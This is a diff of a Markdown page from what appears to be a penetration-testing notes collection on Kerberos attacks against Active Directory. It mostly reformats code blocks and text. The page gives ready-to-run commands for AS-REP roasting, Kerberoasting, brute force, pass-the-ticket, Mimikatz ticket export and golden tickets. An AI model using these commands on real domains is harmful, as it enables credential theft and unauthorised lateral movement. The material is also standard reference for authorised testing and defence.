@@ -6,32 +6,37 @@ This is useful if you have a list of usernames and do not know which are valid o
 
 ### Using LDAP
 
-```text
+```
 LDAP: (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
 ```
 
-LDAP filter for users that do not require Kerberos PREAUTH.  
+LDAP filter for users that do not require Kerberos PREAUTH.  The syntax above `(&(` means a logical AND, where both filters must be true.
 
 ### Using [Impacket](https://github.com/SecureAuthCorp/impacket) GetNPUsers.py
 
+Check for valid users (no credentials required)
+
 ```bash
-# $format is either hashcat or john
-
-# check for valid users (no credentials required)
 python GetNPUsers.py $domain/ -usersfile $users -format $format -outputfile $out_file
+```
 
-# check for users without PREAUTH required (credentials required)
+Check for users without PREAUTH required (credentials required)
+
+```bash
 python GetNPUsers.py $domain/$user:$password -request -format $format -outputfile $out_file
 ```
 
 ### Using [Rubeus](https://github.com/GhostPack/Rubeus) with ASREPRoast module
 
-```bash
-# $format is either hashcat or john
+Check ASREPRoast for all users in current domain
 
-# check ASREPRoast for all users in current domain
+```bash
 .\Rubeus.exe asreproast  /format:$format /outfile:$out_file
 ```
+
+{% hint style="info" %}
+**`$format`** can be either `[`**`hashcat`**`|`**`john`**`]` for both Impacket and Rubeus
+{% endhint %}
 
 ## Brute Force
 
@@ -55,10 +60,9 @@ python3 kerbrute.py -domain $domain -users $users_file -passwords $pass_file -ou
 
 ## Password Spray
 
-Similar to a brute force attack, but only use one \(or a few\) passwords.  This minimizes the chances of account lockout.
+Similar to a brute force attack, but only use one (or a few) passwords.  This minimizes the chances of account lockout. TODO: Add More
 
-```text
-
+```
 ```
 
 ## Kerberoast
@@ -67,7 +71,7 @@ TGS Service key is derived from NTLM hash, so having one can give the other.
 
 ### Enumeration using LDAP
 
-```text
+```
 LDAP: (&(samAccountType=805306368)(servicePrincipalName=*))
 ```
 
@@ -88,7 +92,7 @@ python GetUserSPNs.py $domain/$user:$password -outputfile $out_file
 * Hashcat format: `13100`
 * John format: `krb5tgs`
 
-## Overpass The Hash/Pass The Key \(PTK\)
+## Overpass The Hash/Pass The Key (PTK)
 
 ### Using [Impacket](https://github.com/SecureAuthCorp/impacket) getTGT.py
 
@@ -122,7 +126,7 @@ python3 wmiexec.py $domain/$user@$host -k -no-pass
 
 ## Pass The Ticket
 
-### Linux
+### From Linux
 
 Check type and location of tickets:
 
@@ -153,7 +157,7 @@ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
-#### Convert tickets between Linux/Windows format with [ticket\_converter.py](https://github.com/Zer1t0/ticket_converter)
+#### Convert tickets between Linux/Windows format with [ticket\_converter.py](https://github.com/Zer1t0/ticket\_converter)
 
 ```bash
 # ccache (Linux), kirbi (Windows from mimi/Rubeus) 
@@ -161,11 +165,11 @@ python3 ticket_converter.py $ticket.kirbi $ticket.ccache
 python3 ticket_converter.py $ticket.ccache $ticket.kirbi
 ```
 
-### Windows
+### From Windows
 
 #### Using [Mimikatz](https://github.com/gentilkiwi/mimikatz) to export the tickets
 
-```text
+```
 sekurlsa::tickets /export
 ```
 
@@ -177,7 +181,7 @@ kerberos::ptt $kirbi_file
 
 #### Using [Rubeus](https://github.com/GhostPack/Rubeus) with dump module
 
-```text
+```
 .\Rubeus dump
 ```
 
@@ -255,20 +259,16 @@ kerberos::golden /domain:$domain /sid:$domain_sid /aes256:$aes256_key /user:$use
 python3 -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", f"{password}".encode("utf-16le")).digest())'
 ```
 
-The format string portion may need to be fixed.  This was to show that `{password}` is where the password is inserted.
-
-### Other Tools
-
-* ~~Deprecated~~
+`{password}` is where the password is inserted.
 
 ### Delegation
 
 > Allows a service impersonate the user to interact with a second service, with the privileges and permissions of the user
 >
-> * If a user has delegation capabilities, all its services \(and processes\) have delegation capabilities.
+> * If a user has delegation capabilities, all its services (and processes) have delegation capabilities.
 > * KDC only worries about the user who is talking to, not the process.
 > * Any process belonging to the same user can perform the same actions in Kerberos, regardless of whether it is a service or not.
-> * Unable to delegate if  NotDelegated \(or ADS\_UF\_NOT\_DELEGATED\) flag is set in the User-Account-Control attribute of the user account or user in Protected Users group.
+> * Unable to delegate if  NotDelegated (or ADS\_UF\_NOT\_DELEGATED) flag is set in the User-Account-Control attribute of the user account or user in Protected Users group.
 
 ### Unconstrained delegation
 
@@ -276,4 +276,3 @@ The format string portion may need to be fixed.  This was to show that `{passwor
 2. The KDC checks if User2 has the TrustedForDelegation flag set.
 3. The KDC includes a TGT of User1 inside the TGS for $Service.
 4. $Service receives the TGS with the TGT of User1 included and stores it for later use.
-
